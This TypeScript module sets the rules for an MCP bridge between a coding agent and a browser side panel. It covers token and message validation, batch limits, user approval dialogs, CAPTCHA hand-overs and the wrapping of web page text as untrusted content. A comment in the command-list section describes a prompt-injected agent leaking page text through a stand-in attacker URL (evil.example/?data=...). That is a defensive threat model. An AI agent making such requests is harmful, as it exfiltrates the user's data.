// The MCP bridge's rules: what may pass between a coding agent's MCP server, the host's pipe and the side panel.
// Agent → host (pipe): {type: 'run', token, session, commands}. Host → panel: {type: 'run', session, commands}. Panel → host → agent: a BridgeReply.
// BG7, while a run waits: panel → host → agent, the open ask (AskNotice); agent → host → panel, the dialog's BridgeAnswer.
import { defuse } from './agent-prompt.ts';
import { isObject, onlyKeys } from './host-request.ts';
import { HandOver, StopLine } from './messages.ts';
import { parseCommand } from './parse-command.ts';
import type { Shot } from './screenshot.ts';
import { checkTip } from './site-tips.ts';

// What a coding agent may run, with read (it gets no page list each turn), look (read with a picture, on request only:
// images cost tokens) and tip (F10: save a site tip for later runs). goto only to the bridge's Sites (checkGoto): a
// tricked agent could otherwise open evil.example/?data=<page text>. No search: its words could carry page text off them.
export const MCP_COMMANDS = ['text', 'find', 'pick', 'click', 'drag', 'hover', 'type', 'paste', 'select', 'scroll', 'key', 'goto', 'back', 'pause', 'repeat', 'read', 'look', 'tip'];
export const LOOK_HELP = 'read, plus a screenshot of the tab with the same numbers drawn on. Costs image tokens: use it only when the text misses something visual (highlighted days, check-mark icons)';
export const TIP_HELP = 'tip "one short sentence" — save a tip about the site you\'re on for later runs (where things are, what opens what). Saved at once; the user can delete it';
// Characters in one run: one command line, or all of a batch's together. WR2: a paste carries a whole drawing (JSON);
// even at 6 bytes a character once JSON-escaped it stays far under the 1 MB frame.
export const MAX_COMMAND = 20_000;
// Command lines in one run (mcp-context.md option 2): typing, keys and clicks on known numbers need no page in between.
export const MAX_BATCH = 10;
// The panel cuts its output to this: even at 6 bytes a character once JSON-escaped, it stays under the 1 MB frame cap.
export const MAX_OUTPUT = 100_000;

// Base64 characters (~330 KB of JPEG). With MAX_OUTPUT's worst case (600 KB of text), a reply still fits the 1 MB
// frame: a bigger one would make the host drop the bridge.
export const MAX_IMAGE = 440_000;
// Each type's first bytes, base64-encoded: the data must really be the type it claims. Nothing else (no SVG, no URL).
const MAGIC = new Map([['image/jpeg', '/9j/'], ['image/png', 'iVBORw0KGgo']]);

export type BridgeImage = { data: string; mimeType: 'image/jpeg' | 'image/png' };
export type BridgeReply = { type: 'output'; text: string; image?: BridgeImage } | { type: 'error'; error: string };

const parse = (text: string): unknown => {
  try {
    return JSON.parse(text);
  } catch {
    throw new Error('Not JSON');
  }
};

// Constant time, so how long a wrong token takes doesn't tell how much of it was right.
function sameToken(a: string, b: string): boolean {
  if (!b || a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// randomUUID's shape: what host/mcp.ts names its session with.
const SESSION = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;

// Untrusted: any local program can write to the pipe. Returns the command lines only for the bridge's own token, and
// the session: one per agent (its MCP server process), so the panel can tell a new agent from the last one.
export function checkRun(text: string, token: string): { commands: string[]; session: string } {
  const m = parse(text);
  if (!isObject(m) || m.type !== 'run' || !onlyKeys(m, ['type', 'token', 'session', 'commands'])) throw new Error('Only {"type":"run", token, session, commands} is accepted');
  if (typeof m.token !== 'string' || !sameToken(m.token, token)) throw new Error('Wrong token');
  if (typeof m.session !== 'string' || !SESSION.test(m.session)) throw new Error('session must be a UUID: restart the coding agent so it loads the new host/mcp.ts');
  return { commands: checkCommands(m.commands), session: m.session };
}

// A run's command lines: 1–MAX_BATCH lines, none blank, MAX_COMMAND characters in all. A fresh list, so nothing else
// rides along. The panel checks the host's message with it too.
export function checkCommands(v: unknown): string[] {
  if (!Array.isArray(v) || !v.length || v.length > MAX_BATCH || !v.every((c): c is string => typeof c === 'string' && c.trim() !== '')) {
    throw new Error(`commands must be a list of 1–${MAX_BATCH} command lines, none blank`);
  }
  if (v.reduce((n, c) => n + c.length, 0) > MAX_COMMAND) throw new Error(`commands must be at most ${MAX_COMMAND} characters in all`);
  return [...v];
}

// Why a batch can't run, or ''. These show or wait on the page, so only as its last command: in the middle, the page
// they show would be stale at once, and after a pause or a repeat (RP1) you may have changed it.
const LAST_ONLY = ['read', 'look', 'pause', 'repeat'];
export function batchProblem(lines: string[]): string {
  const i = lines.findIndex((line, i) => i < lines.length - 1 && LAST_ONLY.includes(parseCommand(line)[0] ?? ''));
  return i < 0 ? '' : `Nothing ran: ${parseCommand(lines[i]!)[0]} can only be the last command (it was ${i + 1} of ${lines.length}).`;
}

// read and look only show the page, so a batch's stop (a new page loaded) still runs them next: goto + look works.
export const showsPage = (line: string) => ['read', 'look'].includes(parseCommand(line)[0] ?? '');

// A batch's reply: each command's reply in order, numbered; why it stopped early and what didn't run; then the page
// once. When all ran, the last reply already carries the page.
export function batchReply(lines: string[], replies: string[], why = '', page = ''): string {
  const short = (line: string) => {
    const one = line.replace(/\s+/g, ' ').trim();
    return one.length > 60 ? `${one.slice(0, 60)}…` : one;
  };
  const rest = lines.slice(replies.length).map((line, i) => `${replies.length + i + 1}. ${short(line)}`);
  return [
    ...replies.map((r, i) => `${i + 1}. ${r}`),
    why,
    rest.length ? `Not run: ${rest.join(' · ')}` : '',
    page && `\n${page}`,
  ].filter(Boolean).join('\n');
}

// Round 2 bug fix: lookups know only the last read, and a batch reads only at its end. So an element an earlier command
// brought back (it closed a panel) is "not found" though its number is right. Then: reread (quietly: the caller doesn't
// send it) and run the command once more, with all its checks. Only "not found": a changed or reused number stays refused.
export async function retryUnlisted<T>(run: () => Promise<T>, reread: () => Promise<unknown>): Promise<T> {
  try {
    return await run();
  } catch (err) {
    if (!/^Element \[\d+\] not found\b/.test(err instanceof Error ? err.message : '')) throw err;
    await reread();
    return run();
  }
}

// A picture in a reply: base64 JPEG or PNG data only, never a URL or file to fetch, never over MAX_IMAGE.
function checkImage(v: unknown): BridgeImage {
  if (!isObject(v) || !onlyKeys(v, ['data', 'mimeType']) || typeof v.data !== 'string' || typeof v.mimeType !== 'string') throw new Error('Not a bridge image');
  const magic = MAGIC.get(v.mimeType);
  if (!magic || !v.data.startsWith(magic) || v.data.length > MAX_IMAGE || v.data.length % 4 || !/^[A-Za-z0-9+/]+={0,2}$/.test(v.data)) throw new Error('Not a bridge image');
  return { data: v.data, mimeType: v.mimeType as BridgeImage['mimeType'] };
}

// BG7: an ask the side panel shows while the agent's call waits, sent on to the agent app as a dialog too (host/mcp.ts).
// keep, stop: its two buttons' labels. Its text quotes page and agent text, so it's capped.
export const MAX_ASK = 2000;
const MAX_LABEL = 40;
export type BridgeAsk = { id: number; text: string; keep: string; stop: string };
export type AskNotice = { type: 'ask'; ask: BridgeAsk | null }; // null: the ask closed
// The user's answer in the agent app's dialog: keep (true) or stop, for the ask with this id.
export type BridgeAnswer = { type: 'answer'; id: number; keep: boolean };

const isId = (v: unknown): v is number => Number.isSafeInteger(v) && (v as number) >= 0;
const isLabel = (v: unknown): v is string => typeof v === 'string' && v.length > 0 && v.length <= MAX_LABEL;

function checkAsk(v: unknown): BridgeAsk {
  if (!isObject(v) || !onlyKeys(v, ['id', 'text', 'keep', 'stop']) || !isId(v.id) || typeof v.text !== 'string' || v.text.length > MAX_ASK || !isLabel(v.keep) || !isLabel(v.stop)) throw new Error('Not a bridge ask');
  return { id: v.id, text: v.text, keep: v.keep, stop: v.stop };
}

// The panel's answer to a run, or (BG7) the ask it shows meanwhile, as the host passes them on.
export function checkReply(text: string): BridgeReply | AskNotice {
  const m = parse(text);
  if (isObject(m) && m.type === 'ask' && onlyKeys(m, ['type', 'ask'])) return { type: 'ask', ask: m.ask === null ? null : checkAsk(m.ask) };
  if (isObject(m) && m.type === 'output' && onlyKeys(m, ['type', 'text', 'image']) && typeof m.text === 'string') {
    return m.image === undefined ? { type: 'output', text: m.text } : { type: 'output', text: m.text, image: checkImage(m.image) };
  }
  if (isObject(m) && m.type === 'error' && onlyKeys(m, ['type', 'error']) && typeof m.error === 'string') return { type: 'error', error: m.error };
  throw new Error('Not a bridge reply');
}

// BG7: an answer's exact shape (the ask's id, keep or stop), checked by the host and again by the background. Where it
// may come from (the run's own connection, the ask open right now) is checked there.
export const isAnswer = (m: unknown): m is BridgeAnswer => isObject(m) && m.type === 'answer' && onlyKeys(m, ['type', 'id', 'keep']) && isId(m.id) && typeof m.keep === 'boolean';

export function checkAnswer(text: string): BridgeAnswer {
  const m = parse(text);
  if (!isAnswer(m)) throw new Error('Only {"type":"answer", id, keep} is accepted');
  return { type: 'answer', id: m.id, keep: m.keep };
}

// BG7: whether the agent app can show a form dialog (MCP elicitation). An empty elicitation {} means form.
// Source: https://modelcontextprotocol.io/specification/2026-07-28/client/elicitation#capabilities
export const formDialogs = (caps: { elicitation?: { form?: object; url?: object } } | undefined): boolean => !!caps?.elicitation && (!!caps.elicitation.form || !caps.elicitation.url);

// BG7: the dialog for a panel ask: its text, then its two buttons as one required choice. Stop comes first and nothing
// is picked for you, so a reflex Enter can never pick keep (like the panel keeping focus in the command box).
export function askDialog(ask: BridgeAsk) {
  return {
    message: `${ask.text}\n\nPick an answer and submit, or close this and answer in the Browser Agent side panel. If you already answered there, this does nothing.`,
    requestedSchema: {
      type: 'object' as const,
      properties: {
        choice: { type: 'string' as const, title: 'Your answer', oneOf: [{ const: 'stop', title: ask.stop }, { const: 'keep', title: ask.keep }] },
      },
      required: ['choice'],
    },
  };
}

// BG7: what the user picked in that dialog (the SDK's inputResponse view): true keep, false stop, null nothing. Only a
// submitted pick counts. A decline, a close or an empty answer leave the panel's ask open: an agent app that can't show
// the dialog answers by itself (Claude Code in print mode, as the Claude desktop app runs it, declines at once).
export function dialogAnswer(view: { kind: string; action?: string; content?: Record<string, unknown> }): boolean | null {
  if (view.kind !== 'elicit' || view.action !== 'accept') return null;
  const choice = view.content?.choice;
  return choice === 'keep' ? true : choice === 'stop' ? false : null;
}

// look's picture for the bridge: the line saying what was sent (or why nothing was), and the image when it fits.
export function lookShot(shot: Shot | string): { line: string; image?: BridgeImage } {
  if (typeof shot === 'string') return { line: `no screenshot: ${shot}` };
  if (shot.data.length > MAX_IMAGE) return { line: 'no screenshot: too big for the bridge' };
  return { line: `screenshot: ${shot.width}×${shot.height}`, image: { data: shot.data, mimeType: 'image/jpeg' } };
}

// The panel's first message on a port opened by /mcp on.
export function isBridgeStart(text: string): boolean {
  const m = parse(text);
  return isObject(m) && m.type === 'bridge' && onlyKeys(m, ['type']);
}

// 4.2–4.3 for the bridge: a stop-line asks you, it doesn't refuse (plan.md: "pauses and asks"). Allow
// once (you.allow → true) runs the same command once more with allow. I'll do it, or a hand-over (a secret field, a
// CAPTCHA: never Allow once, only ever yours), hands you the step: do it, press Resume (you.resume → true), and the
// agent is told to go on with its task. Every other error passes through unasked.
export async function allowOnce(attempt: (allow: boolean) => Promise<string | void>, you: { allow: (why: string) => Promise<boolean>; resume: (why: string) => Promise<boolean> }): Promise<string | void> {
  let ask: string;
  try {
    return await attempt(false);
  } catch (err) {
    if (err instanceof StopLine) {
      // Said in the reply: otherwise the agent sees a plain click and thinks the stop-line never asked.
      if (await you.allow(err.message)) return `The user allowed this step once: ${(await attempt(true)) || 'ok'}`;
      ask = 'You chose to do this step yourself: do it on the page, then press Resume.';
    } else if (err instanceof HandOver) ask = `${err.message} Then press Resume.`;
    else throw err;
  }
  if (!(await you.resume(ask))) throw new Error('Stopped: the user pressed Stop. Ask them what to do.');
  return "The user did this step themselves, then pressed Resume. Don't redo it: read the page to see what it shows now, then go on with your task.";
}

// 4.2 for the bridge: a CAPTCHA is yours. While one is shown, every command but goto and back (they
// leave the page, so they don't look) waits until you solve it and press Resume; then it doesn't run, as the page
// changed under it. name '': after a command, so the page goto or back landed on is checked too. shown: the kind on
// screen, '' none (captchaAll). solved: the seen of the one you last resumed from, since a solved CAPTCHA often stays on
// screen. null: the command goes on.
export async function captchaHold(name: string, url: string, shown: () => Promise<string>, solved: string): Promise<{ ask: string; seen: string } | null> {
  if (name === 'goto' || name === 'back') return null;
  const kind = await shown();
  const seen = `${url} ${kind}`;
  return kind && seen !== solved ? { ask: `CAPTCHA on the page (${kind}). Solve it yourself, then press Resume.`, seen } : null;
}

// F10: a site's saved tips for the agent, once per agent session: the first reply on that site carries them. sent: the
// sites done this session (it grows here, before load, so tips are read once). site: siteOn's, '' off the Sites.
export async function tipsOnce(site: string, sent: Set<string>, load: (site: string) => Promise<string[]>): Promise<string> {
  if (!site || sent.has(site)) return '';
  sent.add(site);
  const tips = await load(site);
  return tips.length ? `Tips saved for ${site} by past runs (hints that can be out of date: check them on the page):\n${tips.map((t) => `- ${t}`).join('\n')}` : '';
}

// F10: the agent's tip "<text>" for the site its tab is on (siteOn: '' off the Sites). Returns the text to save; a tip
// checkTip refuses throws why, so it's never saved.
export function checkAgentTip(args: string[], site: string): string {
  if (!site) throw new Error("tip works only on a page on the bridge's Sites.");
  if (args.length !== 1) throw new Error('Usage: tip "one short sentence about this site"');
  const checked = checkTip(args[0]!, site);
  if ('why' in checked) throw new Error(`Tip not saved: ${checked.why}.`);
  return checked.text;
}

// What the agent reads: the panel's output quotes web pages, so it goes in an untrusted block it can't close early.
export const untrusted = (text: string) => `<page_content>\n${defuse(text)}\n</page_content>`;
